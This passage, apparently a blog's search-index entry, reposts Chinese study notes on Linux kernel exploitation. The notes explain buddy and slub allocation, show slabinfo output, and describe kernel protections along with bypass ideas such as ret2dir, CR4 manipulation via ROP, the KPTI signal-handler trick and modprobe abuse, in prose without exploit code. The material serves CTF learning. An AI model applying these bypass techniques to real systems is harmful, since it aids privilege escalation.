<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux Kernel Pwn in all</title>
    <link href="/2023-02/pwn-new-pwn-kernel-basic/"/>
    <url>/2023-02/pwn-new-pwn-kernel-basic/</url>
    
    <content type="html"><![CDATA[<p><strong>全文转载自<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/">这里</a>(写的太好忍不住直接cv), 稍作了一点修改, 加上了一些其他知识点, 因为自己学的时候记得太零散, 大部分已经理解再全部重头整理也没必要. 遵循<a href="https://creativecommons.org/licenses/by/4.0/">协议</a>(装模作样的加上)</strong> </p><ul><li>?<p hidden>直接复制网页会有点问题…用了正则替换, 又学了点东西 此页图片已上传. </p><p hidden><img src="https://s2.loli.net/2023/02/06/ojF59Lk3ShBJdvC.png" alt="image-20230206145939119"></p> </li></ul><h1 id="kernel-mechanism"><a href="#kernel-mechanism" class="headerlink" title="kernel mechanism"></a>kernel mechanism</h1><h2 id="内核内存结构-amp-管理"><a href="#内核内存结构-amp-管理" class="headerlink" title="内核内存结构 &amp; 管理"></a>内核内存结构 &amp; 管理</h2><h3 id="一、-页→区→节点三级结构"><a href="#一、-页→区→节点三级结构" class="headerlink" title="一、 页→区→节点三级结构"></a>一、 页→区→节点三级结构</h3><p>这是一张十分经典的 _Overview_，自顶向下是</p><ul><li><strong>节点</strong>（node，对应结构体 pgdata_list）</li><li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li><li><strong>页</strong>（page，对应结构体 page）</li></ul><img src="https://s2.loli.net/2023/02/06/HDQELjdIpNCT3o8.png" alt="image-20230206222651655" style="zoom:67%;" /><p>看内存管理分析的时候的一点额外笔记:</p><ul><li><p>page结构体相当的长, 看到compound page的时候查了点东西, <a href="https://lwn.net/Articles/565097/">这一篇</a>13年的文章讲了page里面为什么有这么多东西+怎么塞进去的+以及是些啥. 这和我在os实验里(清华的)看到的page复杂多了, 那个就几个成员变量, 而且内核通过链表管理内存空间, 非常简化的实现, 现在linux中使用的SL*B管理+匿名页+<a href="https://lwn.net/Articles/619514/">compound</a>页之类的机制导致page结构体里有非常多的信息. </p></li><li><blockquote><p><strong>Non-uniform memory access</strong> (<strong>NUMA</strong>), </p></blockquote></li></ul><h3 id="二、内存模型"><a href="#二、内存模型" class="headerlink" title="二、内存模型"></a>二、内存模型</h3><p>Linux 提供了三种内存模型，定义于 <code>include/asm-generic/memory_model.h</code> 中，如下图所示（偷的图，侵删）：</p><p><a href="https://i.loli.net/2021/11/25/wLzFuCB5n1DAIY7.png"><img src="https://s2.loli.net/2023/02/06/yAJzZEVLKUvX4li.png" alt="image.png"></a></p><p>内存模型在编译期就会被确定下来，目前常用的是 <code>Sparse Memory</code> 模型，即离散内存模型</p><h3 id="三、buddy-system"><a href="#三、buddy-system" class="headerlink" title="三、buddy system"></a>三、buddy system</h3><blockquote><p>目前的 CTF 题目当中还没有出现针对 buddy system 进行利用的题目，但是<a href="https://etenal.me/archives/1825">有安全研究员在 CVE-2022-27666 中运用了页级堆风水的技巧</a>，笔者认为非常 nb</p></blockquote><p>buddy system 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理者所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理</p><p>在每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span>    <span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：2^order^ </p><p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张_Overview_：</p><p><a href="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png"><img src="https://s2.loli.net/2023/02/06/3vyhlAsYpLqPkdb.png" alt="自己画的图.png" style="zoom: 80%;" /></a></p><ul><li>分配：<ul><li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页</li><li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程</li></ul></li><li>释放：<ul><li>将对应的连续内存页释放到对应的链表上</li><li>检索是否有可以合并的内存页，若有，则进行合成，放入更高 order 的链表中</li></ul></li></ul><p>但是我们很容易产生不容易合并的内存碎片，因此 Linux kernel 还会进行 <em>内存迁移</em> 以减少内存碎片，主要由一个持续运行的内核线程完成，由于不是本篇重点故不在此赘叙. </p><p>在Linux中，使用buddy system分配的底层API主要有 <code>get_free_pages</code> 和 <code>alloc_pages</code>，传入的参数都是order，还有一些flag位.</p><p>值得注意的是这样分配得到的虚拟地址和物理地址都是连续的，返回的地址可以使用 <code>virts_to_phys</code> 或者 <code>__pa</code> 宏转换为物理地址，实际操作也就是加上了一个偏移而已。</p><p>可以通过 <code>/proc/buddyinfo</code> 和 <code>/proc/pagetypeinfo</code> 来查看相关的情况.</p><h3 id="四、slab-allocator"><a href="#四、slab-allocator" class="headerlink" title="四、slab allocator  "></a>四、slab allocator <span id="slab"> </span></h3><p><a href="https://hammertux.github.io/slab-allocator">这篇blog</a>好详细. </p><p>slab allocator 则是更为细粒度的内存管理器，其通过向 buddy system 请求单张或多张连续内存页后再分割成同等大小的<strong>对象</strong>（object）返还给上层调用者来实现更为细粒度的内存管理</p><p>slab allocator 一共有三种版本：</p><ul><li>slab（最初的版本，机制比较复杂，效率不高）</li><li>slob（用于嵌入式等场景的极为简化版本）</li><li>slub（优化后的版本，现在的通用版本</li></ul><p>对于以往的 slub 分配器而言，若是我们 kmalloc(8) 则通常会从 <code>kmalloc-8</code> 中取大小为 8 的 object；但是在 slab 源码中有如下定义：</p><blockquote><p>内核源码版本5.11，include/linux/slab.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The largest kmalloc size supported by the SLAB allocators is</span><br><span class="hljs-comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span><br><span class="hljs-comment"> * less than 32 MB.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * WARNING: Its not easy to increase this value since the allocators have</span><br><span class="hljs-comment"> * to do various tricks to work around compiler limitations in order to</span><br><span class="hljs-comment"> * ensure proper constant folding.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span><br><span class="hljs-meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_LOW    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Kmalloc subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> KMALLOC_MIN_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>即 slab 分配器分配的 object 的大小<strong>最小为 32</strong>，那么我们应当是从 <code>kmalloc-32</code> 中取 object</p><blockquote><p>阅读源码我们可以发现 slab 为 32， 而 slob 和 slub 都是 8</p></blockquote><h4 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I.基本结构"></a>I.基本结构</h4><p><code>slub</code> 版本的 allocator 为现在绝大多数 Linux kernel 所装配的版本，因此本篇文章主要叙述的也是 slub allocator，其基本结构如下图所示：</p><p><a href="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png"><img src="https://s2.loli.net/2023/02/06/sdFTGcnlvqXjB3o.png" alt="image.png"></a></p><ul><li><p>我们将 slub allocator 每次向 buddy system 请求得来的单张/多张内存页称之为一个 <code>slub</code>，其被分割为多个同等大小对象（object），每个 object 作为一个被分配实体，<strong>在 slub 的第一张内存页对应的 page 结构体上的 freelist 成员指向该张内存页上的第一个空闲对象(所以可以用page来指代一个slub)</strong>, 一个 slub 上的所有空闲对象组成一个以 NULL 结尾的单向链表</p><blockquote><p>一个 object 可以理解为用户态 glibc 中的 chunk，<strong>不过 object 并不像 chunk 那样需要有一个 header，因为 page 结构体与物理内存间存在线性对应关系，我们可以直接通过 object 地址找到其对应的 page 结构体</strong> </p></blockquote></li><li><p><code>kmem_cache</code> 为一个基本的 allocator 组件，其用于分配某个特定大小（某种特定用途）的对象，所有的 kmem_cache 构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code></p></li><li><p>一个 <code>kmem_cache</code> 主要由两个模块组成：</p><ul><li><code>kmem_cache_cpu</code>：这是一个<strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以 gs 寄存器作为 percpu 段的基址进行寻址），用以表示当前核心正在使用的 slub，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时<strong>不需要加锁</strong>，从而极大地提高了性能</li><li><code>kmem_cache_node</code> : 可以理解为当前 <code>kmem_cache</code> 的 slub 集散中心，其中存放着两个 slub 链表：<ul><li>partial：该 slub 上存在着一定数量的空闲 object，但并非全部空闲</li><li>full：该 slub 上的所有 object 都被分配出去了</li></ul></li></ul></li></ul><h4 id="II-分配-释放过程"><a href="#II-分配-释放过程" class="headerlink" title="II.分配/释放过程"></a>II.分配/释放过程</h4><p>那么现在我们可以来说明 slub allocator 的分配/释放行为了</p><ul><li>分配：<ul><li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回</li><li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被加入到 <code>kmem_cache_node</code> 的 <strong>full</strong> 链表，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回</li><li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li></ul></li><li>释放：<ul><li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist</li><li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist</li><li>若被释放 object 属于 <code>kmem_cache_node</code> 的 full 链表上的 slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会从 full 链表迁移到 partial 链表</strong></li></ul></li></ul><p>以上便是 slub allocator 的基本原理</p><h4 id="III-slab-alias-mergeability"><a href="#III-slab-alias-mergeability" class="headerlink" title="III. slab alias-mergeability"></a>III. slab alias-mergeability</h4><p>slab alias 机制是一种对同等/相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等/近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong> </li></ul><p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong> </p><p><strong>对于包含有用户空间数据的独立 kmem_cache 而言，其永远不会与现有的 kmem_cache 发生合并</strong> </p><p>Cache aliasing information is available in <code>/sys/kernel/slab/</code>. For example, the following caches are all merged together:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ls -al /sys/kernel/slab | grep <span class="hljs-string">&#x27;:t-0000128&#x27;</span></span><br>lrwxrwxrwx   1 root root 0 May 16 21:30 aio_kiocb -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 btree_node -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 cifs_mpx_ids -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ecryptfs_key_tfm_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 eventpoll_epi -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 fib6_nodes -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ip6_mrt_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ip_mrt_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 kmalloc-128 -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 pid -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 scsi_sense_cache -&gt; :t-0000128<br>drwxr-xr-x   3 root root 0 May 16 21:30 :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 uid_cache -&gt; :t-0000128<br></code></pre></div></td></tr></table></figure><p>There is also a <code>slabinfo</code> tool shipped with the <a href="https://elixir.bootlin.com/linux/latest/source/tools/vm/slabinfo.c">kernel source</a> that can print the aliasing information in a nicer format (i.e., <code>slabinfo -a</code>) by parsing <code>/sys/kernel/slabinfo</code>.</p><h3 id="查看slab"><a href="#查看slab" class="headerlink" title="查看slab"></a>查看slab</h3><p><code>kmem_cache</code>是类似于glibc arena的结构，每个<code>kmem_cache</code>由若干个slab构成，每个slab由一个或多个连续的页组成。<code>kmem_cache</code>有一个重要的性质，就是其中所有的object大小都是相同的（准确的说是分配块的大小都相同). </p><p>我们借助linux的 <code>/proc/slabinfo</code> 来说明，也可以使用 <code>slabtop</code> 工具来查看slab分配的状态。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cat /proc/slabinfo</span><br><span class="hljs-meta">#</span><span class="bash"> name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="hljs-built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span><br>...<br>task_struct         1194   1287   8576    3    8 : tunables    0    0    0 : slabdata    429    429      0<br>cred_jar            8665  11088    192   42    2 : tunables    0    0    0 : slabdata    264    264      0<br>...<br>kmalloc-8192         498    532   8192    4    8 : tunables    0    0    0 : slabdata    133    133      0<br>kmalloc-4096         697    776   4096    8    8 : tunables    0    0    0 : slabdata     97     97      0<br>kmalloc-2048        2954   3088   2048   16    8 : tunables    0    0    0 : slabdata    193    193      0<br>kmalloc-1024        8494   8960   1024   32    8 : tunables    0    0    0 : slabdata    280    280      0<br>kmalloc-512         6414   6624    512   32    4 : tunables    0    0    0 : slabdata    207    207      0<br>kmalloc-256         3021   3936    256   32    2 : tunables    0    0    0 : slabdata    123    123      0<br>kmalloc-192         7152   7350    192   42    2 : tunables    0    0    0 : slabdata    175    175      0<br>kmalloc-128        21357  23712    128   32    1 : tunables    0    0    0 : slabdata    741    741      0<br>kmalloc-96         11669  25158     96   42    1 : tunables    0    0    0 : slabdata    599    599      0<br>kmalloc-64         40682  47808     64   64    1 : tunables    0    0    0 : slabdata    747    747      0<br>kmalloc-32         22528  22528     32  128    1 : tunables    0    0    0 : slabdata    176    176      0<br>kmalloc-16         12032  12032     16  256    1 : tunables    0    0    0 : slabdata     47     47      0<br>kmalloc-8          10240  10240      8  512    1 : tunables    0    0    0 : slabdata     20     20      0<br>kmem_cache_node      512    512     64   64    1 : tunables    0    0    0 : slabdata      8      8      0<br>kmem_cache           250    250    320   25    2 : tunables    0    0    0 : slabdata     10     10      0<br></code></pre></div></td></tr></table></figure><p>这个文件列出了目前所有的 <code>kmem_cache</code>，第一列是每个mem_cache的名字，我们拿 <code>kmalloc-64</code> 来做说明</p><ul><li>active_objs: 目前使用中的object数量，一共分配出了40682个objects.</li><li>num_objs: 总共能够分配的object数量，这里最大是47808个.</li><li>objsize: 每个object的大小，这里是64 bytes.</li><li>objperslab: 每个slab可以有多少个object，这里是64个.</li><li>pagesperslab: 每个slab对应几个page，这里是1个.</li></ul><p>所以我们可以看出，<code>kmalloc-64</code> 这个mem_cache，每个slab有1个page也就是4K，每个对象是64B，所以每个slab能容纳的对象是 <code>4K / 64B = 64</code> 个. 如果分配了object数量超过了64个，就需要从别的slab分配，如果分配的对象超过了47808个，就需要申请新的slab，也就是向buddy system申请新的内存页.</p><h3 id="相关API"><a href="#相关API" class="headerlink" title="相关API"></a>相关API</h3><p>Linux中的一些常用内核API.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">struct kmem_cache * <span class="hljs-title">kmem_cache_create</span> <span class="hljs-params">(    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span>      size,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span>      align,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>      flags,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">void</span> (*ctor(<span class="hljs-keyword">void</span>*, struct kmem_cache *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>),</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">void</span> (*dtor(<span class="hljs-keyword">void</span>*, struct kmem_cache *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>));</span></span><br></code></pre></div></td></tr></table></figure><p>创建mem_cache，需要指定name和size.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">kmem_cache_alloc</span> <span class="hljs-params">(struct kmem_cache * cachep, <span class="hljs-keyword">gfp_t</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>在mem_cache中分配object，这里不需要指定size因为在创建时就已经指定好了.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kmem_cache_free</span> <span class="hljs-params">(struct kmem_cache * cachep, <span class="hljs-keyword">void</span> * objp)</span></span>;<br></code></pre></div></td></tr></table></figure><p>在mem_cache中释放object.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">kmalloc</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">gfp_t</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>分配size大小的对象，会在 <code>kmalloc-xxx</code> 这些特殊的mem_cache里找到一个适合的进行分配. <strong>向2^n^大小往上对齐</strong>.<br>如果size超过了最大的kmalloc mem_cache，比如上面那个slabinfo里最大的是 <code>kmalloc-8192</code>，如果分配超过8192 bytes的话，还是会调用底层API直接向buddy申请内存. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kfree</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> * objp)</span></span>;<br></code></pre></div></td></tr></table></figure><p>释放对象 <code>objp</code> ，实际会先找到其所在的page，然后读取page结构中指向其所属slab的指针，进而放到对应的freelist（单链表）中，并将指向freelist中下一块的fd指针写到块的头部.</p><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><h3 id="一-通用保护机制"><a href="#一-通用保护机制" class="headerlink" title="一. 通用保护机制"></a>一. 通用保护机制</h3><blockquote><p>KASLR FGASLR SMAP SMEP KPTI(从软件层面修复了 Meltdown 漏洞) </p><p>STACK PROTECTOR </p></blockquote><p>KPTI启用是返回用户态会导致segmentation fault，这个时候我们可以<strong>把原来的返回地址 getRootShell 函数设为 SIGSEGV 信号的处理函数</strong>，这样原先的 <code>swapgs ; iretq</code> 的方法就可以继续用了</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>利用<strong>内核线性映射区</strong>(应该是指内核虚址空间在物理上也是连续的)对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 <strong>ret2dir</strong> 是我还没有见过的方式</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，<strong>但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</strong> </li><li>当下面这个启用时modeprobe方法就不管用了(悲). </li></ul><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER</span>=y<br><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER_PATH</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="二-内核“堆”上保护机制"><a href="#二-内核“堆”上保护机制" class="headerlink" title="二. 内核“堆”上保护机制"></a>二. 内核“堆”上保护机制</h3><blockquote><p>more info 可以参考<a href="https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022">这里</a></p></blockquote><h4 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h4><p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界</strong>. 这一保护被用于 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 中, 在4.16以前的(部分)<a href="https://lwn.net/Articles/695991/">方法</a>是:</p><ul><li>在栈上copy就检查是否在当前栈帧, </li><li>在slab上的copy就检查是否在object范围内. </li></ul><p>而在4.16(2018年)之后又添加了 <code>useroffset</code> <code>usersize</code> 两个变量到 <code>keme_cache</code> 中, 用以标明object中用户可访问的区域. 而general cache都会被设置成offset=0 size=object size. </p><p>这样的副作用是当一个cache is user accessible, 这个cache不能和其他的cache合并, 即使<code>CONFIG_HARDENED_USERCOPY</code>是关闭的 ! 但还可以使用slab级的spray. 详见<a href="#fuck">这里</a> </p><p>不过这种保护 <em>不适用于内核空间内的数据拷贝</em> ，这也是目前主流的绕过手段, 例如RCTF2022中game预期解, 利用modify_ldt的内核中<code>memcpy()</code>. </p><h4 id="GFP-KERNEL-ACCOUNT"><a href="#GFP-KERNEL-ACCOUNT" class="headerlink" title="GFP_KERNEL_ACCOUNT"></a>GFP_KERNEL_ACCOUNT</h4><p>在5.9之前, 有两种kmem_caches, one for system-wide and <strong>non-accounted allocations</strong> and the second one shared by all <strong>accounted allocations</strong>. 这时使用<code>GFP_KERNEL_ACCOUNT</code>分配的cache会被当做独立的allocation. </p><p>而5.9将两者合一, 只在需要的时候allocate obj_cgroup metadata, 这样无论obj是否被accounted都视作同样的cache. 这时无论<code>kmalloc</code>带有<code>GFP_KERNEL_ACCOUNT</code>或者<code>GFP_KERNEL</code>都可分配为同一个kmalloc-xxx. </p><p>但是在5.14后又没法用了, 因为objcg pointer array可能就在要free的slab尾部, 导致递归free栈溢出, 于是将<code>kmalloc-&lt;n&gt; caches</code>分成两种, 一种只作为unaccounted, 另一种作为<code>kmalloc-cg-&lt;n&gt;</code>. 其他的cache仍然使用混合体. </p><h4 id="Hardened-freelist"><a href="#Hardened-freelist" class="headerlink" title="Hardened freelist"></a>Hardened freelist</h4><p>链接中没有, <a href="https://rtfingc.github.io/slub-freelist-hardened">这里</a>是带源码的介绍. </p><p>类似于 glibc 2.32 版本引入的保护，在开启这种保护之前，slub 中的 free object 的 next 指针直接存放着 next free object 的地址，攻击者可以通过读取 freelist 泄露出内核线性映射区的地址，在开启了该保护之后 free object 的 next 指针存放的是由以下三个值进行异或操作后的值：</p><ul><li>当前 free object 的地址</li><li>下一个 free object 的地址</li><li>由 kmem_cache 指定的一个 random 值</li></ul><p>攻击者至少需要获取到第一与第三个值才能篡改 freelist，这无疑为对 freelist 的直接利用增添不少难度</p><blockquote><p>在更新版本的 Linux kernel 中似乎还引入了一个偏移值，笔者尚未进行考证. </p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/mm/slab.c?id=2e6b3602168797fd4d80d86d208c4ba8fcfa3b8b">16年</a>引入了. 真的够早的. 但仅是put the freelist at the end of slab page. </p></blockquote><h4 id="Random-freelist"><a href="#Random-freelist" class="headerlink" title="Random freelist"></a>Random freelist</h4><p>linux 4.8+: 这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object 之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址</p><p>需要注意的是这种保护发生在<strong>slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO</strong> </p><p><a href="https://s2.loli.net/2022/03/11/wQzINfhXV3gpGxJ.png"><img src="https://s2.loli.net/2023/02/06/poheBnWDqAiV4z2.png" 